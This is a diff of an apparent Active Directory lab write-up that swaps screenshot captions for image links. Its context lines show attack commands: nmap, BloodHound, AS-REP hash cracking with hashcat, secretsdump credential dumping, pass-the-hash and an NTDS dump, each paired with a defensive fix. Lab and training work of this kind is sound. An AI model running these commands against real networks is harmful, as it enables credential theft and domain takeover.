@@ -91,7 +91,7 @@ nmap -sV -sC -p 88,135,139,389,445,3268,3389 192.168.10.10
 - Port 445 (SMB) — SMB signing enabled (good security posture)
 - Port 3389 (RDP) — filtered by firewall
 
-📸 *Screenshot: 01_nmap_scan.png*
+ ![nmap scan](screenshots/01_nmap_scan.png)
 
 ---
 
@@ -109,7 +109,7 @@ Invoke-BloodHound -CollectionMethod All
 
 **Key finding:** BloodHound identified an attack path through `svc.sql` to Domain Admins via its assigned SPN.
 
-📸 *Screenshot: 02_bloodhound_attack_path.png*
+![Bloodhound](screenshots/02_bloodhound_attack_path.png)
 
 ---
 
@@ -139,8 +139,8 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
 
 **Result:** `jane.smith : Password123!` — cracked in under 20 seconds.
 
-📸 *Screenshot: 03_asrep_hash.png*  
-📸 *Screenshot: 04_hashcat_crack.png*
+![Asrep](screenshots/03_asrep_hash.png)  
+![Hashcat](screenshots/04_hashcat_crack.png)
 
 **Defensive fix:** Enable Kerberos pre-authentication on all accounts. Audit with:
 ```powershell
@@ -170,7 +170,7 @@ CORP.LOCAL/helpdesk      — hash recovered
 CORP.LOCAL/svc.sql       — hash recovered
 ```
 
-📸 *Screenshot: 05_secretsdump_corppc.png*
+![secretsdump](screenshots/05_secretsdump_corppc.png)
 
 **Defensive fix:** Deploy Credential Guard. Implement LAPS for unique local admin passwords. Reduce cached credential count to 1 via Group Policy.
 
@@ -199,7 +199,7 @@ netexec smb 192.168.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
 SMB  192.168.10.10  445  DC01  [+] corp.local\Administrator (Pwn3d!)
 ```
 
-📸 *Screenshot: 06_pass_the_hash_pwned.png*
+![pwned](screenshots/06_pass_the_hash_pwned.png)
 
 **Defensive fix:** Enable Credential Guard. Enforce tiered administration — DA accounts must never log into workstations. Enable Protected Users group for privileged accounts.
 
@@ -232,7 +232,7 @@ python3 secretsdump.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
 
 > ⚠️ The `krbtgt` hash enables Golden Ticket attacks — forged Kerberos tickets that grant persistent Domain Admin access even after password resets.
 
-📸 *Screenshot: 07_ntds_dump.png*
+![ntds](screenshots/07_ntds_dump.png)
 
 **Defensive fix:** Rotate krbtgt password twice. Restrict DCSync rights to Domain Controllers only. Alert on Event ID 4662 (DS-Replication-Get-Changes).
 
